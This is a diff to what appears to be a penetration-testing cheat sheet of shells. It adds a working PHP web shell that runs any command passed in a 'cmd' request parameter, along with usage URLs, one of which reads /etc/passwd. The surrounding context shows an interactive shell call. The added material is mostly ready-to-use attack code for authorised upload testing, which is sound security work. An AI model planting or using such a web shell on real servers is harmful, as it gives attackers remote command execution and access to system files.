@@ -123,6 +123,29 @@ exec("sh -i");
   echo system($command);
 ?>
 ```
+usage examples
+```
+url/webshell.php?cmd=ls
+```
+
+## PHP Webshell
+https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Malicious_Files
+```
+<?php
+    if ($_SERVER['REMOTE_HOST'] === "FIXME") { // Set your IP address here
+        if(isset($_REQUEST['cmd'])){
+            $cmd = ($_REQUEST['cmd']);
+            echo "<pre>\n";
+            system($cmd);
+            echo "</pre>";
+        }
+    }
+?>
+```
+Once the shell is uploaded (with a random name), you can execute operating system commands by passing them in the cmd GET parameter:
+```
+https://example.org/7sna8uuorvcx3x4fx.php?cmd=cat+/etc/passwd
+```
 
 ## Perl:
 ```
